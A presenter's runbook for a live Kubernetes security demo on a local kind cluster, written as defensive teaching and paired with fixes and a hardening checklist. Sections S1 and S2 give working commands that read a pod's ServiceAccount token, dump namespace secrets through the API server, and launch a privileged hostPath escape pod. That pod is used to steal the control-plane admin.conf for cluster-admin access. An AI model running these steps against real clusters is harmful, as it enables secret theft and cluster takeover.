# K8s Offensive Security — Live Demo Runbook

**Slot:** after step 6 (HPA), before the wrap-up. ~12–15 min total.
**Story:** one attack chain, two attack surfaces. *"Remember the whoami app we exposed on `localhost:30090`? Imagine it had an RCE."* We exec into the pod as a stand-in for the attacker's shell, and we never leave the cluster until we own all of it.

**Every command in this runbook was tested against a kind cluster (k8s v1.34).**

| Segment | Attack surface | Ends with |
|---|---|---|
| S1 | Stolen ServiceAccount token + over-granted RBAC | DB password exfiltrated |
| S2 | Privileged pod → node escape | Stolen cluster-admin kubeconfig |
| S3 | — | The fixes, live: both attacks blocked |

## Before this segment

```bash
./reset.sh                              # in security-demo/ (~10s)
```

- Same split-pane setup as the main runbook. Left pane = commands, right pane can keep showing `kubectl get pods -A`.
- Big terminal font. The curl commands are long — consider pasting them from this file rather than typing.
- If you are on the `k8s-demo` cluster from `../setup.sh`: the demo deletes the whoami `web` Deployment (reset.sh does it). The Service `web` from step 3 is left alone.

---

## S1. Stolen ServiceAccount token (~5 min)

**Say:** In Kubernetes, a pod doesn't log in with a password. Its identity is a token that Kubernetes *mounts into the pod as a file*, automatically, for every pod. Anyone who can run code inside the pod — a compromised dependency, an RCE, a curious shell — *is* that ServiceAccount. Question is only: what can that identity do?

**Type (get the attacker's shell):**

```bash
kubectl exec -it deploy/web -c app -- sh
```

**Type (the pod's identity is a file):**

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

**Point out:** Three files: the token, the CA cert, the namespace. The token is a JWT. Decode it right here — it's just base64:

```bash
P=$(cut -d. -f2 /var/run/secrets/kubernetes.io/serviceaccount/token | tr "_-" "/+")
while [ $((${#P}%4)) -ne 0 ]; do P="${P}="; done
echo "$P" | base64 -d
```

**Point out:** Read the claims out loud: `"sub": "system:serviceaccount:default:web"` — *who we are*, `"iss": "https://kubernetes.default..."` — *who says so*, `"kubernetes.io"` — which pod/node bound this token. No signature needed to *read* it; the signature only stops you from *forging* it.

**Type (attack the API server directly — no kubectl, no kubeconfig, just curl):**

```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/version
```

**Point out:** That's the control plane answering. `kubernetes.default.svc` is the API server's in-cluster DNS name. Everything kubectl does is just this: HTTPS + a bearer token. We just did kubectl's job with curl.

**Type (contrast — the API is not anonymous):**

```bash
curl -s --cacert $CA https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

**Point out:** `403 Forbidden`, `User "system:anonymous" cannot list resource "secrets"`. Without the token: nothing. So the token IS the perimeter.

**Type (now ask: what can this identity do?):**

```bash
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets | head -c 500
```

**Point out:** A `SecretList`. The Role in `02-rbac.yaml` granted this SA `get,list` on secrets — someone "just wanted to read one config value" — so it can read *every* secret in the namespace. Grab the loot:

```bash
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/app-secret | grep DB_PASSWORD
```

```bash
curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/app-secret \
  | grep DB_PASSWORD | cut -d'"' -f4 | base64 -d
```

**Point out:** `s3cr3t`. Callback to step 4: "Secrets are just base64 — anyone who can *read* Secrets can read the password." You just watched it happen, from inside a compromised pod, with the pod's own identity. Leave the shell open.

**Optional (from the laptop, second terminal):** show the attacker doesn't even need the shell — the identity name is enough to enumerate permissions:

```bash
kubectl auth can-i --as=system:serviceaccount:default:web --list -n default
kubectl auth can-i --as=system:serviceaccount:default:web create pods -n default   # yes...
kubectl auth can-i --as=system:serviceaccount:default:web delete secrets -n default # ...but no
```

**Point out:** `create pods: yes`. Remember that. Exit the shell: `exit`.

---

## S2. Privileged pod → node escape → cluster takeover (~5 min)

**Say:** Reading secrets is bad. But that Role has one more line: the SA can `create pods`. If you can create pods, you don't steal credentials — you *install yourself*.

**Type (show the "malicious" manifest first):**

```bash
cat 03-escape-pod.yaml
kubectl apply -f 03-escape-pod.yaml
kubectl get pod backup-tool -o wide
```

**Point out:** It landed on `whdemo-control-plane` (or `k8s-demo-control-plane`). Walk the YAML: `nodeSelector` + `tolerations` pin it to the control-plane node; `privileged: true` = root with all capabilities inside the node; `hostPath: /` mounted at `/host` = the node's entire disk. Nothing here is exotic — every field is legal, everyday Kubernetes used by monitoring agents and CSI drivers. The only thing that made this an attack was one line of RBAC.

**Type (inside the escape pod):**

```bash
kubectl exec -it backup-tool -- sh
ls /host/etc/kubernetes/
head -5 /host/etc/kubernetes/admin.conf
exit
```

**Point out:** `/etc/kubernetes/admin.conf` is the node's boot credential for the control plane: a client certificate for `kubernetes-admin` — *the* cluster-admin. It's readable because we mounted the node's disk and we're privileged. Exfiltrate it:

```bash
kubectl exec backup-tool -- cat /host/etc/kubernetes/admin.conf > /tmp/stolen-admin.conf
grep server /tmp/stolen-admin.conf
```

**Point out:** One problem: the server is `https://<cluster>-control-plane:6443` — a name that only resolves inside the Docker network. But kind publishes the API on localhost, so just point the kubeconfig there:

```bash
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
sed -i "s|https://[^:]*:6443|$SERVER|" /tmp/stolen-admin.conf
```

**Type (use the stolen identity):**

```bash
kubectl --kubeconfig /tmp/stolen-admin.conf get nodes
kubectl --kubeconfig /tmp/stolen-admin.conf get secrets -A
```

**Point out:** Every secret, every namespace — grafana passwords, TLS keys, service-account tokens. Same kubectl, zero permissions of our own; we are `kubernetes-admin` now. The chain was: app RCE → file in the pod → one RoleBinding → node disk → cluster root. Four hops, all enabled by config.

**Optional (drama):**

```bash
kubectl --kubeconfig /tmp/stolen-admin.conf delete secret app-secret
```

**Kind kicker (from the laptop):**

```bash
docker ps
```

**Point out:** The "node" we escaped to is just a Docker container on this laptop. In kind the blast radius ends here; on real nodes, privileged + hostPath is effectively root on a production machine.

---

## S3. Fix it in 60 seconds (~3 min)

**Say:** Everything we just did came from three misconfigurations. Each has a one-line fix — let's do them live and re-run the attack.

**Type (fix 1 — RBAC: take the grants away):**

```bash
kubectl delete rolebinding web
kubectl auth can-i --as=system:serviceaccount:default:web list secrets -n default   # no
kubectl auth can-i --as=system:serviceaccount:default:web create pods -n default    # no
```

**Point out:** The token is still mounted — but now it's an ID card that opens nothing. Least privilege isn't "less risky", it's the difference between "attacker in one pod" and "attacker owns the cluster".

**Type (fix 2 — Pod Security: block the escape pod):**

```bash
kubectl label --overwrite ns default pod-security.kubernetes.io/enforce=restricted
kubectl apply -f 03-escape-pod.yaml
```

**Point out:** Rejected. Read the error out loud: `must not set securityContext.privileged=true`, `restricted volume type "hostPath"`... One namespace label and the whole escape class is dead. This is Pod Security Admission — built into Kubernetes since 1.23, no extra tools.

**Type (fix 3 — stop mounting tokens apps don't need):**

```bash
kubectl patch deploy web --type=json \
  -p '[{"op":"add","path":"/spec/template/spec/automountServiceAccountToken","value":false}]'
kubectl rollout status deploy/web
kubectl exec -it deploy/web -c app -- sh
ls /var/run/secrets/kubernetes.io/serviceaccount/
```

**Point out:** `No such file or directory`. If your app never calls the API — and most don't — there is no token to steal. The full hardened manifest is in `04-hardened.yaml`.

**Say (close the segment):** The mindset shift: in Kubernetes, *identity* is the perimeter — the perimeter is a file inside the pod. Checklist to take home: no blanket `list secrets`, no `create pods` for app SAs, `automountServiceAccountToken: false` by default, `enforce=restricted` on every namespace that runs app code. Mention (no demo): NetworkPolicies stop lateral movement, and real secret material belongs in Vault/cloud KMS.

---

## Teardown

```bash
kubectl label --overwrite ns default pod-security.kubernetes.io/enforce-   # optional
kubectl delete deploy/web,sa/web,role/web pod/backup-tool secret/app-secret --ignore-not-found
rm -f /tmp/stolen-admin.conf
# full cluster teardown:
kind delete cluster --name k8s-demo
```

---

## Troubleshooting

| Symptom | Fix |
|---|---|
| `exec: sh: not found` | you're in the wrong container: add `-c app` |
| curl `Connection refused` / DNS failure | pod not fully up; `kubectl rollout status deploy/web` |
| Stolen kubeconfig: `connection refused 127.0.0.1:6443` | `SERVER=$(kubectl config view ...)` step skipped, or wrong kubeconfig context active — re-run the `sed` |
| Stolen kubeconfig: TLS/permission errors | re-copy `admin.conf` from the pod; kind certs include `127.0.0.1` so no TLS flags needed |
| PSA label prints warnings about existing pods | harmless — enforcement only applies to *new* pods |
| Attack-1 curl returns `403` | rolebinding was deleted (S3 already run) — re-run `./reset.sh` |

## Reality check (say this if asked)

- Real SA tokens are time-bound (1h) and audience/node-bound — but 1 hour is plenty, and a live attacker just re-reads the file.
- Stolen `admin.conf` is a *client certificate*, no expiry in practice — that's why control-plane nodes are treated as tier-0 assets.
- We used the API server as the attack path; in real incidents the kubelet read-only port, exposed dashboards, and supply-chain images are equally common entry points.
